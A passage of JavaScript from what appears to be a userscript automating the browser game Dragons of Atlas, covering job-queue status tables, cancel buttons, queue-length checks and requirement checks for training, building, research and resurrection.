			t.building.timer.tick = setTimeout ( t.buildTick, 3000 );
			t.building.inProgress = false; 
		} 
		else {
			// Erase previous feedback
			t.dispFeedback('');
		}
	},

	setResearchEnable : function ( on_off )
	{
		var t = Tabs.Jobs;
		t.refreshResearchButton( on_off );
		Data.options.research.enabled = on_off;
		
		if ( on_off ){
			t.dispFeedback(translate('Starting soon') + '...' + translate('Please wait') + '...');
			t.research.error_delay = 20000;
			t.research.timer.tick = setTimeout( t.researchTick, 5000 );
		} 
		else {
			clearTimeout ( t.research.timer.tick ); t.research.timer.tick=null;
		}
	},
	
	refreshTrainButton : function ( on_off )
	{
		var t = Tabs.Jobs;
		var but = $id(UID['Tabs.Jobs.tabTrain.enabled']);
		
		if ( !but ) return;
		
		if ( on_off ) {
			but.value = translate('Training').toUpperCase();
			but.className = UID['btn_on'];
		} 
		else {
			but.value = translate('Disabled').toUpperCase();
			but.className = UID['btn_off'];
		}
	},

	refreshResurrectButton : function ( on_off )
	{
		var t = Tabs.Jobs;
		var but = $id(UID['Tabs.Jobs.tabResurrect.enabled']);
		
		if ( !but ) return;
		
		if ( on_off ) {
			but.value = translate('Resurrect').toUpperCase();
			but.className = UID['btn_on'];
		} 
		else {
			but.value = translate('Disabled').toUpperCase();
			but.className = UID['btn_off'];
		}
	},

	refreshBuildButton : function ( on_off )
	{
		var t = Tabs.Jobs;
		var but = $id(UID['Tabs.Jobs.tabBuild.enabled']);
		
		if ( !but ) return;
		
		if ( on_off ) {
			but.value = translate('Building').toUpperCase();
			but.className = UID['btn_on'];
		} 
		else {
			but.value = translate('Disabled').toUpperCase();
			but.className = UID['btn_off'];
		}
	},

	refreshResearchButton : function ( on_off )
	{
		var t = Tabs.Jobs;
		var but = $id(UID['Tabs.Jobs.tabResearch.enabled']);
	
		if ( !but ) return;
		
		if ( on_off ) {
			but.value = translate('Researching').toUpperCase();
			but.className = UID['btn_on'];
		} 
		else {
			but.value = translate('Disabled').toUpperCase();
			but.className = UID['btn_off'];
		}
	},

	trainStatTick : function ()
	{
		var t = Tabs.Jobs;
	
		var html = '<table class="' + UID['table'] + ' zebra" style="width:100%">';
		
		var jobs_id = [];

		for ( var city_idx = 0; city_idx < Seed.cities.length; city_idx++ )
		{
			var city = Seed.cities[city_idx];
			
			// in case the city is not been defined in Seed.updateCity skip to next in array.
			if ( !city || city_idx == OUTPOST_TYPE_INDEX['SpectralDragonOutpost'] || city_idx == OUTPOST_TYPE_INDEX['SkythroneOutpost'] ) continue;

			t.refreshTrainBtn(city_idx); //Didi : add refresh training button
			
			var jobs = getJobs ( 'units', city_idx );
			var tabSets_total_time = '';

			if ( jobs.length === 0) {
				html += 
				'<tr>'
				+'	<td>'
				+'	<b>' + translate( city.name ) + ':</b>&nbsp;'
				+'	</td>'
				+'	<td>'
				+'		<span class=' + UID['bold_red'] + '>' + translate('Off') + '</span>'
				+'	</td>'
				+'	<td width="99%"></td>'
				+'</tr>';
				tabSets_total_time = 'Off';
			}
			else {
				
				var last_time = serverTime();
			
				jobs.sort( function(a,b){ return a.run_at - b.run_at; } );
				
				for ( var i = 0; i < jobs.length; i++ )
				{
					var city_name='', total_time='', left_time = 0;
					if ( i === 0 )
					{
						city_name = '<b>' + translate(city.name) +'</b>:'; 
					}
					else if ( i === jobs.length - 1 ) {
						left_time = ( jobs[i].run_at - serverTime() > 0 ) ? jobs[i].run_at - serverTime() : 0;
						total_time = '&nbsp;<b>('+ timeFormat( left_time ) +')</b>';
					}
					
					if ( i === jobs.length - 1 ) {
						left_time = ( jobs[i].run_at - serverTime() > 0 ) ? jobs[i].run_at - serverTime() : 0;
						tabSets_total_time = timeFormat( left_time ,false, 'tfg');
					}
					
					left_time = ( jobs[i].run_at - last_time > 0 ) ? jobs[i].run_at - last_time : 0;
					
					html += 
					  '<tr>'
					+'	<td>'
					+		city_name + '&nbsp;'
					+'	</td>'
					+'	<td width="70%">'
					+'		<span class="' + UID['doa-icons'] + ' i-' + jobs[i].unit_type + '"></span>'
					+ 		jobs[i].quantity + '&nbsp;&nbsp;' + translate(jobs[i].unit_type)
					+'	</td>'
					+'	<td align=right>'
					+		timeFormat( left_time, true ) + total_time
					+ ' <input type=image class="ui-corner-all '+ UID['doa-icons'] + ' i-cancel" id="' + setUID('Tabs.Jobs.tabTrain.jobcancel_' + jobs[i].city_id + '_' + jobs[i].id) + '" ref="' + jobs[i].city_id + '_' + jobs[i].id + '" style="background-color:rgb(140,140,140);" value="" /> '
					+'	</td>'
					+ '</tr>';
					last_time = jobs[i].run_at;
					jobs_id.push( UID['Tabs.Jobs.tabTrain.jobcancel_' + jobs[i].city_id + '_' + jobs[i].id] );
				}

			}

			if ( Data.options.training.current_tab === 0 ) {
				$J('#'+UID['Tabs.Jobs.tabTrain.tabSets_' + city_idx]).html( tabSets_total_time );
			}
			 
		}
		html + '</table>';
		
		$J('#'+UID['Tabs.Jobs.tabTrain.report']).html( html );

		// Didi : Add event listeners for cancel train 
		for ( var i=0; i < jobs_id.length; i++ ) 
		{
			$J('#'+jobs_id[i]).click( function (event) {
					var self = event.target;
					
					self.disabled = true;
					self.style.display = 'none';
					
					// Take the job id and city id from the "ref" attribute
					var args = self.getAttribute( 'ref' ).split('_');
					var city_id = parseInt(args[0]);
					var job_id = parseInt(args[1]);

					if ( Seed.jobs[ city_id ] [ job_id ] )
					{
					
						MyAjax.cancel_jobs({
							city_id   : city_id,
							job_id   	: job_id,
							
							onSuccess : function ( r ) {
							},
							
							onFailure : function ( r ) {
							},
							caller    : 'Tabs.jobs.trainStatTick'
						});
					}

				} );
		}
	
	},
	
	// resurreection statistics - timer set to fire every 1 seconds
	resurrectStatTick : function ()
	{
		var t = Tabs.Jobs;
		var city_idx = OUTPOST_TYPE_INDEX['SpectralDragonOutpost'];
		var city = Seed.cities[city_idx];
		
		if (!city) return;
		
		t.refreshResurectBtn(city_idx); //Didi : add refresh resurrection button

		var html = '<table class="' + UID['table'] + ' zebra" style="width:100%">';
				
		var jobs = getJobs ( 'resurrection', city_idx);

		if ( jobs.length === 0 ){
			html += 
			'<tr>'
			+'	<td>'
			+'	<b>' + translate( city.name ) + ':</b>&nbsp;'
			+'	</td>'
			+'	<td>'
			+'		<span class=' + UID['bold_red'] + '>' + translate('Off') + '</span>'
			+'	</td>'
			+'	<td width="99%"></td>'
			+'</tr>';
		}
		else {

			var last_time = serverTime();
			
			jobs.sort( function(a,b){ return a.run_at - b.run_at; } );
			
			for ( var i = 0; i < jobs.length; i++ )
			{
				var city_name='', total_time='', left_time = 0;
				if ( i === 0 )
				{
					city_name = '<b>' + translate(city.name) +'</b>:'; 
				}
				else if ( i === jobs.length - 1 ) {
					left_time = ( jobs[i].run_at - serverTime() > 0 ) ? jobs[i].run_at - serverTime() : 0;
					total_time = '&nbsp;<b>('+ timeFormat( left_time ) +')</b>';
				}
				
				if ( i === jobs.length - 1 ) {
					left_time = ( jobs[i].run_at - serverTime() > 0 ) ? jobs[i].run_at - serverTime() : 0;
					//tabSets_total_time = timeFormat( left_time ,false, 'tfg');
				}
				
				left_time = ( jobs[i].run_at - last_time > 0 ) ? jobs[i].run_at - last_time : 0;
				
				html += 
				  '<tr>'
				+'	<td>'
				+		city_name + '&nbsp;'
				+'	</td>'
				+'	<td width="70%">'
				+'		<span class="' + UID['doa-icons'] + ' i-' + jobs[i].unit_type + '"></span>'
				+ 		jobs[i].quantity + '&nbsp;&nbsp;' + translate(jobs[i].unit_type)
				+'	</td>'
				+'	<td align=right>'
				+		timeFormat( left_time, true ) + total_time
				//+ ' <input type=image class="ui-corner-all '+ UID['doa-icons'] + ' i-cancel" id="' + setUID('Tabs.Jobs.tabResurrect.jobcancel_' + jobs[i].city_id + '_' + jobs[i].id) + '" ref="' + jobs[i].city_id + "_" + jobs[i].id + '" style="background-color:rgb(140,140,140);" value="" /> '
				+'	</td>'
				+ '</tr>';
				last_time = jobs[i].run_at;
				//jobs_id.push( UID['Tabs.Jobs.tabResurrect.jobcancel_' + jobs[i].city_id + '_' + jobs[i].id] );
			}
		}
							
		html += '</table>';
		
		$J('#'+UID['Tabs.Jobs.tabResurrect.report']).html( html );

		if ( Data.options.resurrection.current_tab === 0 ) {
			var souls = Seed.cities[0].souls;
			var total_soul = 0;
			for ( var unit_type in souls ) {
				total_soul += souls[unit_type];
			}
			var soul_cap =  Seed.cities[0].figures.soul_cap;
			var set_total_soul = '<span class=tfg-h>' + total_soul + '</span>' + '<span class=tfg-d>' + ' / ' + '</span>' + '<span class=tfg-m>' + soul_cap + '</span>';
			$J('#'+UID['Tabs.Jobs.tabResurrect.set_' + city_idx]).html( set_total_soul );
		}

	},

	// Build statistics - timer set to fire every 1 seconds
	buildStatTick : function ()
	{
		var t = Tabs.Jobs;
		var html = '<table class="' + UID['table'] + ' zebra" style="width:100%">';
		
		for ( var city_idx=0; city_idx < Seed.cities.length; city_idx++ )
		{
			var city = Seed.cities[city_idx];
			
			// in case the city is not been defined in Seed.updateCity skip to next in array.
			if ( !city ) continue;
			
			t.refreshBuildBtn(city_idx); //Didi : add refresh building button
			
			html += 
			 '<tr>'
			+'	<td>'
			+' 		<b>' + translate(city.name) +'</b>:&nbsp;'
			+'	</td>'
			+'	<td>';
			
			var jobs = getJobs ( 'building', city_idx );
			
			if ( jobs.length === 0 ){
				html += translate('Off') 
				+'	</td>'
				+'	<td width="99%"></td>'
				+'</tr>';
			}
			else {
				var job = jobs[0];
			
				var left_time = ((job.run_at - serverTime()) > 0) ? (job.run_at - serverTime()) : 0;
				
				if ( left_time )
				{
					
					var fixed_city_idx = ( /Science|Metal|Officer|Rookery|Storage|Theater|Sentinel|Factory|Fortress/.test(job.city_building_type) ? '0' : city_idx);
					
					var city_type = 'C';
					if (fixed_city_idx > 0) city_type = 'O';
					if (fixed_city_idx === OUTPOST_TYPE_INDEX['SpectralDragonOutpost']) city_type = 'S';

					html += 
					 '		<span class="' + UID['doa-icons'] + ' i-' + job.city_building_type + '-' + city_type +'"></span>'
					+		translate(job.city_building_type) + '  ('+ job.level +') '
					+'	</td>'
					+'	<td align=right>'
					+		timeFormat( left_time, true )
					+'	</td>'
					+'</tr>';
					
					try {
						$J('#'+UID['Tabs.Jobs.tabBuild.lefttime_' + city_idx]).html( timeFormat( left_time ,false, 'tfg') );
					} catch(e){}
					
					try {
						$J('#'+UID['Tabs.Jobs.tabBuild.feedback_' + city_idx + '_' + job.city_building_type]).html( '<font color=#000>' + translate('Building') + ': ' + translate(job.city_building_type) + ' ' + translate('Level').toLowerCase() + ' ' + job.level + '</font>' );
					} catch(e){}
				}
			}
		}
		
		// Refresh the current Tab if job is finish
		if ( t.building.refreshTab ) {
			setTimeout(function(){
				t.building.refreshTab = false;
				// If the user is on building tab 
				if ( t.current_tab === 2 ) {
					// Refresh the Tab
					t.tabBuild ( );
				}
			}, 1000);
		}

		html += '</table>';
		
		$J('#'+UID['Tabs.Jobs.tabBuild.report']).html( html );
	},

	// Build statistics - timer set to fire every 1 seconds
	researchStatTick : function ()
	{
		var t = Tabs.Jobs;
		
		var html = '<table class="' + UID['table'] + ' zebra" style="width:100%">';
		
		for ( var city_idx=0; city_idx < Seed.cities.length; city_idx++ )
		{
			var city = Seed.cities[city_idx];
			
			// in case the city is not been defined in Seed.updateCity skip to next in array.
			if ( !city ) continue;
			if ( !city.figures.queue_lengths['research'] ) continue;
			
			var jobs = getJobs ( 'research', city_idx );
			
			if ( jobs.length === 0 ){
				if ( city_idx == 0 || Data.options.cheat.outpost_research ) {
					html += 
					 '<tr>'
					+'	<td>'
					+' 		<b>' + translate(city.name) +'</b>:&nbsp;'
					+'	</td>'
					+'	<td>'
					+			 translate('Off') 
					+'	</td>'
					+'	<td width="99%"></td>'
					+'</tr>';
				}
			}
			else {
				html += 
				 '<tr>'
				+'	<td>'
				+' 		<b>' + translate(city.name) +'</b>:&nbsp;'
				+'	</td>'
				+'	<td>';

				var job = jobs[0];
			
				var left_time = ((job.run_at - serverTime()) > 0) ? (job.run_at - serverTime()) : 0;
				
				if ( left_time )
				{
					html += 
					 '		<span class="' + UID['doa-icons'] + ' i-' + job.research_type + '"></span>'
					+		translate(job.research_type) +' ('+ job.level +') '
					+'	</td>'
					+'	<td align=right>'
					+		timeFormat( left_time, true )
					+'	</td>'
					+'</tr>';
					
					try {
						$J('#'+UID['Tabs.Jobs.tabResearch.feedback_'+job.research_type]).html( '<font color=#000>' + translate('Researching') + '&nbsp;' + translate('Level').toLowerCase() + '&nbsp;' + job.level + '</font>' );
					}catch(e){}
				}
			}
		}
							
		// Refresh the current Tab because job research finish
		if ( t.research.refreshTab ) {
			setTimeout(function(){
				t.research.refreshTab = false;
				// If the user is on building tab 
				if ( t.current_tab === 3 ) {
					// Refresh the Tab
					t.tabResearch ( );
				}
			}, 1000);
		}
		
		html += '</table>';
		
		$J('#'+UID['Tabs.Jobs.tabResearch.report']).html( html );
	},

	// Modified to work with jobs
	dispFeedback : function ( msg )
	{
		var t = Tabs.Jobs;
		var elementId = '';   

		switch ( t.current_tab ) 
		{
		case 0: break;
		case 1: elementId = 'Tabs.Jobs.tabTrain.feedback'; break;
		case 2: elementId = 'Tabs.Jobs.tabBuild.feedback'; break;
		case 3: elementId = 'Tabs.Jobs.tabResearch.feedback'; break;
		case 4: elementId = 'Tabs.Jobs.tabResurrect.feedback'; break;
		} 
		
		var $element = $J('#'+UID[elementId]);
		
		if ( $element.length )
		{
			if ( msg === '' ){
				$element.html ( msg );
			} 
			else {
				$element.html ( new Date().toTimeString().substring (0,8) +'&nbsp;'+  msg );
			}
		}
	},


	// Return the total number units of the specified type adding in the quantity about to 
	// be produced. If this number is less than the cap, return zero     
	getUnitCap : function( unit_type, quantity )
	{
		var t = Tabs.Jobs;
		var max_cap = 0;
		var training = 0;
		var total_troop = 0;
		
		// Get the cap set for this unit type
		max_cap = Data.options.training.units_cap[unit_type];
		
		// If there is no cap, we are done
		if (max_cap === 0){
			return max_cap;
		}

		//get total units 
		var num_units = Units.getUnitNumbers( Seed.cities[0], unit_type );
		total_troop = num_units.total;
		training = num_units.intraining;
		
		return ( (total_troop + training + quantity) > max_cap ) ? ( total_troop + training + quantity ) : 0;
	},
	
	// Training - Get the remainin queue length (Fixed by Lord Mimir)
	getRemainingQueue : function ( city_idx, queue_type )  
	{  
		var city = Seed.cities[city_idx];  
		
		// queue_length (fixed by LES..)
		var queue_length = ( city.figures.queue_lengths[queue_type] ? city.figures.queue_lengths[queue_type] : Seed.cities[0].figures.queue_lengths[queue_type] || 0 );
		
		//Check if queue_length is a number and not 0
		if ( !queue_length )
		{  
			return 0;
		}
		
		// Count the number of jobs in the queue
		var jobs = getJobs( queue_type, city_idx );

		return queue_length - jobs.length;
	},
	
	/*
		options:{
			reqs_type     : the type of requirements to check
			city_idx      : the city index ( if omitted, use the capital, city_idx = 0 )
			unit_type | building_type | research_type : (only one of them)
			unit_quantity : this is just for when we check requirements for units (training) 
			                should be omitted for buildings and research
			level         :
			
		}
	*/
	checkRequirements : function ( options )
	{
		var reqs = {};

		// options.unit_type and options_training_type are the same,
		// we can use either interchangeably
		var element_type =  options.unit_type     || 
							options.training_type || 
							options.building_type || 
							options.research_type ||
							options.dragon_name;
		
		var requirements = Seed.requirements[ options.reqs_type ][ element_type ];
		var stats = Seed.stats[ options.reqs_type ][ element_type ];
		
		// in case of level
		if ( typeof (options.level) !== 'undefined' ) {
			requirements = requirements.level[ options.level ];
			stats = stats.level[ options.level ];
		}
		
		// if omitted options.city_idx, use the capital, city_idx = 0
		// this value is only used by requirements.buildings case
		var	city_idx = options.city_idx || 0;
	
		//always use the capital data to verify the resources and the population
		var city = Seed.cities[ 0 ];
		
		// If we are verifying unit requirements, initialize the variable max_units
		if ( options.unit_type || options.reqs_type == 'unit' ) {
			reqs.max_units = 999999999;
		}
		
		// set Speed Multiplier for every case
		var speed_multiplier = 1;
		switch ( options.reqs_type ) {
		case 'unit':
			// This value is calculated by Seed.updateCity
			speed_multiplier = Seed.cities[ city_idx ].figures.unit.speed_multiplier;
      if ( element_type == "SwiftStrikeDragon" || element_type == "BattleDragon" )
			{
				speed_multiplier *= (1+(Seed.cities[ city_idx ].figures.unit.rookery_multiplier / 100));
			}
			break;
		case 'resurrect':
			// This value is calculated by Seed.updateCity
			speed_multiplier = Seed.cities[ city_idx ].figures.unit.speed_multiplier;
			break;
		case 'building':
			speed_multiplier = city.figures.building.speed_multiplier;
			break;
		}
				
		// Set time needed for this task
		reqs.time = parseInt( (stats.time / speed_multiplier)*100 ) / 100;
				
		// when omitted options.unit_quantity, sets unit_quantity to 1 to check 
		// the requirements of the buildings and research.
		var unit_quantity = options.unit_quantity || 1;
				
		// Check Buildings requirements
		if ( requirements.buildings )
		{
			for ( var type in requirements.buildings )
			{
				var fixed_type = type;
				
				// we change the type of build Garrison to TrainingCamp in case of outpost city
				if ( type == 'Garrison' && city_idx != 0 ) {
					fixed_type = 'TrainingCamp';
				}
				
				var fixed_city_idx = ( /Garrison|ScienceCenter|Metalsmith|OfficerQuarter|MusterPoint|Rookery|StorageVault|Theater|Sentinel|Factory|Fortress/.test(fixed_type) ? '0' : city_idx);
				var fixed_city_idx = ( /Mausoleum|DarkPortal|SpectralDragonKeep|EnergyCollector/.test(fixed_type) ? OUTPOST_TYPE_INDEX['SpectralDragonOutpost'] : fixed_city_idx);
				var fixed_city_idx = ( /Cathedral|Forge|Greenhouse|KaiserDragonKeep|Library|Workshop/.test(fixed_type) ? OUTPOST_TYPE_INDEX['SkythroneOutpost'] : fixed_city_idx);

				var city_type = 'C';
				if (fixed_city_idx > 0) city_type = 'O';
				if (fixed_city_idx === OUTPOST_TYPE_INDEX['SpectralDragonOutpost']) city_type = 'S';
				
				var level = Buildings.getLevel( fixed_city_idx, fixed_type );
				
				if ( level.max < requirements.buildings[ type ] )
				{
					if ( !reqs.buildings ) reqs.buildings = {};
					reqs.buildings[ fixed_type ] = requirements.buildings[ type ];
					reqs.msg = (reqs.msg||'') + translate(fixed_type) + '(' + reqs.buildings[ fixed_type ] + ')' + ' + ';
					reqs.imsg = (reqs.imsg||'') + ' <span class="' + UID['doa-icons'] + ' i-' + fixed_type + '-' + city_type + '"></span>' + '(' + reqs.buildings[ fixed_type ] + ')' + ' + ';
				}
			}
		}
		
		// Check Items requirements ( Fixed by Jawz )
		if (requirements.items) {
			for (var type in requirements.items) {
				var need = requirements.items[ type ] * unit_quantity;
				var have = parseInt(Seed.player.items[ type ] || 0);
				if ( have < need ) {
					if ( !reqs.items ) reqs.items = {};
					reqs.items[ type ] = need - have;
					reqs.msg = (reqs.msg||'') + translate(type) + '(' + reqs.items[ type ] + ')' + ' + ';
					reqs.imsg = (reqs.imsg||'') + ' <span class="' + UID['doa-icons'] + ' i-' + type + '"></span>' + (reqs.items[ type ] > 1 ? (' ' + reqs.items[ type ]) : '' ) + ' + ';
				}
				// If we are verifying unit requirements, calculate the maximum units
				if ( reqs.max_units ) {
					var current_max = parseInt( have / requirements.items[type] );
					if ( reqs.max_units > current_max ) {
						reqs.max_units = current_max;
					}
				}
			}
		}
		
		// Check Population requirements
		if ( requirements.population && requirements.population.idle )
		{
			var need = requirements.population.idle * unit_quantity;
			var have = city.figures.population.current - city.figures.population.laborers - city.figures.population.armed_forces;
			have = (have > 0) ? have : 0;
			if ( have < need ) {
				reqs.population =  need - have;
				reqs.msg = (reqs.msg||'') + translate('Population') + ':' + reqs.population.intToCommas() + ' + ';
				reqs.imsg = (reqs.imsg||'') + ' <span class="' + UID['doa-icons'] + ' i-population"></span>' + ' ' + reqs.population.intToCommas() + ' + ';
			}
			
			// If we are verifying unit requirements, calculate the maximum units
			if ( reqs.max_units ) {
				var current_max = parseInt( (have+1) / requirements.population.idle );
				if ( reqs.max_units > current_max ) {
					reqs.max_units = current_max;
				}
			}
		}
		
		// Check Research requirements
		if ( requirements.research )
		{
			for ( var type in requirements.research )
			{
				if ( (Seed.player.research[ type ] || 0) < requirements.research[ type ] )
				{
					if ( !reqs.research ) reqs.research = {};
					reqs.research[ type ] = requirements.research[ type ];
					reqs.msg = (reqs.msg||'') + translate(type) + '(' + reqs.research[ type ] + ')' + ' + ';
					reqs.imsg = (reqs.imsg||'') + ' <span class="' + UID['doa-icons'] + ' i-' + type + '"></span>' + '(' + reqs.research[ type ] + ')' + ' + ';
				}
			}
		}
		
		// Check Resources requirements
		if ( requirements.resources )
		{
			for ( var type in requirements.resources )
			{
				if ( requirements.resources[ type ] == 0 ){
					continue;
				}
				var need = requirements.resources[ type ] * unit_quantity;
				var have = parseInt(city.resources[ type ] || 0);

				if ( have < need )
				{
					if ( !reqs.resources ) reqs.resources = {};
					reqs.resources[ type ] = need - have;
					reqs.msg = (reqs.msg||'') + translate(type.replace(/_/,' ')) + ':' + reqs.resources[ type ].intToCommas() + ' + ';
					reqs.imsg = (reqs.imsg||'') + ' <span class="' + UID['doa-icons'] + ' i-' + type + '"></span>' + ' ' + reqs.resources[ type ].intToCommas() + ' + ';
				}
				
				// If we are verifying unit requirements, calculate the maximum units
				if ( reqs.max_units ) {
					var current_max = parseInt( (have+1) / requirements.resources[ type ] );
					if ( reqs.max_units > current_max ) {
						reqs.max_units = current_max;
					}
				}
			}
		}
		
		// Check units requirements
		if ( requirements.units )
		{
			for ( var type in requirements.units )
			{
				if ( requirements.units[ type ] == 0 ){
					continue;
				}
				var need = requirements.units[ type ] * unit_quantity;
				var have = Units.getUnitNumbers(Seed.cities[0], type).incity
				if ( have < need )
				{
					if ( !reqs.units ) reqs.units = {};
					reqs.units[ type ] = need - have;
					reqs.msg = (reqs.msg||'') + translate(type) + ':' + reqs.units[ type ] + ' + ';
					reqs.imsg = (reqs.imsg||'') + ' <span class="' + UID['doa-icons'] + ' i-' + type + '"></span>' + ' ' + reqs.units[ type ] + ' + ';
				}
				
				// If we are verifying unit requirements, calculate the maximum units
				if ( reqs.max_units ) {
					var current_max = parseInt( have / requirements.units[ type ] );
					if ( reqs.max_units > current_max ) {
						reqs.max_units = current_max;
					}
				}

			}
		}
		
		// Set time needed for this units task based in quantity
		if ( reqs.max_units ) {
			var time_for_one_unit = stats.time / speed_multiplier;
	    if ( options.reqs_type == 'unit' ) {
	    	if ( element_type == 'ForestTroop' && time_for_one_unit < 1799 )
				{
					time_for_one_unit=1799;
				}
	    	if ( element_type == 'ArcticLeviathan' && time_for_one_unit < 1200)
				{
					time_for_one_unit=1200;
				}
			}
			reqs.time = parseInt( (options.unit_quantity || 0) * time_for_one_unit );
		}
		
		if ( reqs.msg ){
			reqs.msg = reqs.msg.substring(0,reqs.msg.length-3);
			reqs.imsg = reqs.imsg.substring(0,reqs.imsg.length-3);
		}
		
		return reqs;
		
	},
	
	/*
		options:{
			reqs_type     : the type of requirements to check
			city_idx      : the city index ( if omitted, use the capital, city_idx = 0 )
			unit_type | building_type | research_type : (only one of them)
			unit_quantity : this is just for when we check requirements for units (training) 
			                should be omitted for buildings and research
			level         :
			
		}
	*/
	getRequirements : function ( options )
	{
		var reqs = {};

		// options.unit_type and options_training_type are the same,
		// we can use either interchangeably
		var element_type =  options.unit_type     || 
							options.training_type || 
							options.building_type || 
							options.research_type ||
							options.dragon_name;
		
		var requirements = Seed.requirements[ options.reqs_type ][ element_type ];
		
		// in case of level
		if ( typeof (options.level) !== 'undefined' ) {
			requirements = requirements.level[ options.level ];
		}
		
		// Check Buildings requirements
		if ( requirements.buildings )
		{
			for ( var type in requirements.buildings )
			{

				var fixed_city_idx = ( /Mine|Farm|Lumbermill|Quarry|Home|Garrison|ScienceCenter|Metalsmith|OfficerQuarter|MusterPoint|Rookery|StorageVault|Theater|Sentinel|Factory|Fortress|DragonKeep|Wall/.test(type) ? 0 : 1 );
				var fixed_city_idx = ( /Mausoleum|DarkPortal|SpectralDragonKeep|EnergyCollector/.test(type) ? OUTPOST_TYPE_INDEX['SpectralDragonOutpost'] : fixed_city_idx);
				var fixed_city_idx = ( /Cathedral|Forge|Greenhouse|KaiserDragonKeep|Library|Workshop/.test(type) ? OUTPOST_TYPE_INDEX['SkythroneOutpost'] : fixed_city_idx);

				var city_type = 'C';
				if (fixed_city_idx > 0) city_type = 'O';
				if (fixed_city_idx === OUTPOST_TYPE_INDEX['SpectralDragonOutpost']) city_type = 'S';

				if ( !reqs.buildings ) reqs.buildings = {};
				reqs.buildings[ type ] = requirements.buildings[ type ];
				reqs.msg = (reqs.msg||'') + translate(type) + '(' + reqs.buildings[ type ] + ')' + ' + ';
				reqs.imsg = (reqs.imsg||'') + '<span class="' + UID['doa-icons'] + ' i-' + type + '-'+ city_type +'"></span>';
			}
		}
		
		// Check Items requirements ( Fixed by Jawz )
		if (requirements.items) {
			for (var type in requirements.items) {
				var need = requirements.items[ type ];

				if ( !reqs.items ) reqs.items = {};
				reqs.items[ type ] = need;
				reqs.msg = (reqs.msg||'') + translate(type) + '(' + reqs.items[ type ] + ')' + ' + ';
				reqs.imsg = (reqs.imsg||'') + '<span class="' + UID['doa-icons'] + ' i-' + type + '"></span>';
			}
		}
		
		// Check Population requirements
		if ( requirements.population && requirements.population.idle )
		{
			var need = requirements.population.idle;

			reqs.population =  need;
			reqs.msg = (reqs.msg||'') + translate('Population') + ':' + reqs.population.intToCommas() + ' + ';
			reqs.imsg = (reqs.imsg||'') + '<span class="' + UID['doa-icons'] + ' i-population"></span>';
		}
		
		// Check Research requirements
		if ( requirements.research )
		{
			for ( var type in requirements.research )
			{
				if ( !reqs.research ) reqs.research = {};
				reqs.research[ type ] = requirements.research[ type ];
				reqs.msg = (reqs.msg||'') + translate(type) + '(' + reqs.research[ type ] + ')' + ' + ';
				reqs.imsg = (reqs.imsg||'') + '<span class="' + UID['doa-icons'] + ' i-' + type + '"></span>';
			}
		}
		
		// Check Resources requirements
		if ( requirements.resources )
		{
			for ( var type in requirements.resources )
			{
				if ( requirements.resources[ type ] == 0 ){
					continue;
				}
				var need = requirements.resources[ type ];

				if ( !reqs.resources ) reqs.resources = {};
				reqs.resources[ type ] = need;
				reqs.msg = (reqs.msg||'') + translate(type.replace(/_/,' ')) + ':' + reqs.resources[ type ].intToCommas() + ' + ';
				reqs.imsg = (reqs.imsg||'') + '<span class="' + UID['doa-icons'] + ' i-' + type + '"></span>';
			}
		}
		
		// Check units requirements
		if ( requirements.units )
		{
			for ( var type in requirements.units )
			{
				if ( requirements.units[ type ] == 0 ){
					continue;
				}
				var need = requirements.units[ type ];

				if ( !reqs.units ) reqs.units = {};
				reqs.units[ type ] = need;
				reqs.msg = (reqs.msg||'') + translate(type) + ':' + reqs.units[ type ] + ' + ';
				reqs.imsg = (reqs.imsg||'') + '<span class="' + UID['doa-icons'] + ' i-' + type + '"></span>';
			}
		}
			
		if ( reqs.msg ){
			reqs.msg = reqs.msg.substring(0,reqs.msg.length-3);
		}
		
		return reqs;
		
	},
	
	checkTrainReqs : function( unit_type, unit_quantity, city_idx ) {
		var t = Tabs.Jobs;
		
		var reqs = t.checkRequirements ({
			reqs_type     : 'unit', 
			city_idx      : city_idx, 
			unit_type     : unit_type, 
			unit_quantity : unit_quantity
		});
		
		// Check Remaining Queue
		if ( t.getRemainingQueue(city_idx, 'units') == 0 ) {
			reqs.queue = true;
			if ( reqs.msg ) {
				reqs.msg = (reqs.msg||'') + ' + ' + translate('Training Queue Full');
			} else {
				reqs.msg = translate('Training Queue Full');
			}
			if ( reqs.imsg ) {
				reqs.imsg = (reqs.imsg||'') + ' + ' + translate('Training Queue Full');
			} else {
				reqs.imsg = translate('Training Queue Full');
			}
		}
		
		// Check Units Cap
		var capped = t.getUnitCap(unit_type, unit_quantity);
		if ( capped ) {
			reqs.capped = capped;
			if ( reqs.msg ) {
				reqs.msg = (reqs.msg||'') + ' + ' + translate('Production Limit');
			} else {
				reqs.msg = translate('Production Limit');
			}
			if ( reqs.imsg ) {
				reqs.imsg = (reqs.imsg||'') + ' + ' + translate('Production Limit');
			} else {
				reqs.imsg = translate('Production Limit');
			}
		}

		if (t.current_tab === 1) {
			if ( reqs.msg )
			{
				$J('#'+UID['Tabs.Jobs.tabTrain.feedback_' + city_idx + '_' + unit_type])
				.html( '<span style="color:#a00 !important">' + reqs.imsg + '</span>' );
				$J('#'+UID['Tabs.Jobs.tabTrain.feedback_' + city_idx +'_'+ unit_type])
				.attr ( 'title', translate(unit_type) + ' \n' + reqs.msg.replace(/\+/g,' \n') );
			} 
			else {
				$J('#'+UID['Tabs.Jobs.tabTrain.feedback_' + city_idx + '_' + unit_type])
				.html(  timeFormat( reqs.time, true ) + ' (' + translate('Max') + ': ' + reqs.max_units.intToCommas() + ')' );
			}
		}
		
		return reqs;

	},
	
	// check resurrection requirements
	checkResurrectReqs : function( unit_type, unit_quantity, city_idx ) {
		var t = Tabs.Jobs;
		
		var reqs = t.checkRequirements ({
			reqs_type     : 'resurrect', 
			city_idx      : city_idx, 
			unit_type     : unit_type, 
			unit_quantity : unit_quantity
		});
		
		// Check Remaining Queue
		if ( t.getRemainingQueue(city_idx, 'resurrection') == 0 ) {
			reqs.queue = true;
			if ( reqs.msg ) {
				reqs.msg = (reqs.msg||'') + ' + ' + translate('Resurrection Queue Full');
			} else {
				reqs.msg = translate('Resurrection Queue Full');
			}
			if ( reqs.imsg ) {
				reqs.imsg = (reqs.imsg||'') + ' + ' + translate('Resurrection Queue Full');
			} else {
				reqs.imsg = translate('Resurrection Queue Full');
			}
		}
		
		// Check Units Max
		var capped = ( unit_quantity > (Seed.cities[0].souls [ unit_type ]||0) );
		if ( capped ) {
			reqs.capped = capped;
			if ( reqs.msg ) {
				reqs.msg = (reqs.msg||'') + ' + ' + translate('Resurrection Limit');
			} else {
				reqs.msg = translate('Resurrection Limit');
			}
			if ( reqs.imsg ) {
				reqs.imsg = (reqs.imsg||'') + ' + ' + translate('Resurrection Limit');
